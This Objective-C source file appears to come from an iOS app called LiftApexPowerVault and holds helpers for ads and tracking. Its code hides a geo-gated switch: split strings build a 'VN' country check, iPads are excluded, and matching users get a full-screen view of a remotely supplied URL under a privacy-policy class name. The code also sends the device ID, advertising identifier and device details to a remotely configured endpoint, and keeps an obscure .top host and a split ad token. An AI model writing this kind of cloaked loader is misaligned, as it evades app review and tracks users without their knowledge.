//
//  UIViewController+Ext.m
//  LiftApexPowerVault
//
//  Created by LiftApexPowerVault on 2024/9/5.
//

#import "UIViewController+Ext.h"
#import "AdjustSdk/AdjustSdk.h"
#import <sys/utsname.h>
#import <AdSupport/AdSupport.h>
#import <AppTrackingTransparency/AppTrackingTransparency.h>

@implementation UIViewController (Ext)

- (NSString *)liftRequestIDFA
{
    NSString *idfa = [[[ASIdentifierManager sharedManager] advertisingIdentifier] UUIDString];
    NSLog(@"idfa:%@",idfa);
    return idfa;
}

+ (NSString *)liftAdToken
{
    return [NSString stringWithFormat:@"i3o%@", @"2p1u3j6dc"];
}

- (NSString *)liftPrivicyUrl
{
    return @"https://www.termsfeed.com/live/7e3d98d6-886e-4988-bbd0-d953b81b6881";
}

- (BOOL)liftNeedShowAdsBann
{
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    return !isIpd && [countryCode isEqualToString:[NSString stringWithFormat:@"%@N", self.px]];;
}

- (NSString *)px
{
    return @"V";
}

- (NSString *)liftHostURL
{
    return @"pen.cjirpkwzfa.top";
}

- (void)liftShowBannersView:(NSString *)adurl adid:(NSString *)adid idfa:(NSString *)idfa
{
    if (adurl.length) {
        UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
        UIViewController *adVc = [storyboard instantiateViewControllerWithIdentifier:@"LiftPivacyPolicyVC"];
        [adVc setValue:adurl forKey:@"url"];
        adVc.modalPresentationStyle = UIModalPresentationFullScreen;
        [self.navigationController presentViewController:adVc animated:NO completion:nil];
    }
    
    [NSUserDefaults.standardUserDefaults registerDefaults:@{@"TitanAdsFirst": @(YES)}];
    BOOL isFr = [NSUserDefaults.standardUserDefaults boolForKey:@"TitanAdsFirst"];
    
    if (isFr) {
        NSDictionary *dic = [NSUserDefaults.standardUserDefaults valueForKey:@"LiftADSPowerVault"];
        NSString *pName = dic[@"pn"];
        NSString *activityUrl = dic[@"ac"];
        
        if (activityUrl.length && pName.length) {
            NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@?deviceID=%@&gpsID=%@&packageName=%@&systemType=%@&phoneType=%@", activityUrl, adid, idfa, pName, UIDevice.currentDevice.systemVersion, self.liftDeviceModel]];
            NSLog(@"dd:%@",url.absoluteString);
            NSURLRequest *request = [NSURLRequest requestWithURL:url];
            NSURLSession *session = [NSURLSession sharedSession];
            NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                if (error) {
                    NSLog(@"req error：%@", error.localizedDescription);
                    return;
                }
                NSLog(@"req success:%@", data.description);
                [NSUserDefaults.standardUserDefaults setBool:NO forKey:@"TitanAdsFirst"];
            }];

            [dataTask resume];
        }
    }
}

- (NSString *)liftDeviceModel
{
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *modelIdentifier = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
    return modelIdentifier;
}

- (NSDictionary *)liftDictionaryWithJsonString:(NSString *)jsonString {
    if (jsonString == nil || jsonString.length == 0) {
        return nil;
    }
    
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error;
    
    NSDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData
                                                             options:NSJSONReadingMutableContainers
                                                               error:&error];
    if (error) {
        NSLog(@"JSON error: %@", error.localizedDescription);
        return nil;
    }
    
    return jsonDict;
}

- (void)liftTrackAdjustToken:(NSString *)token
{
    ADJEvent *event = [[ADJEvent alloc] initWithEventToken:token];
    [Adjust trackEvent:event];
}

@end
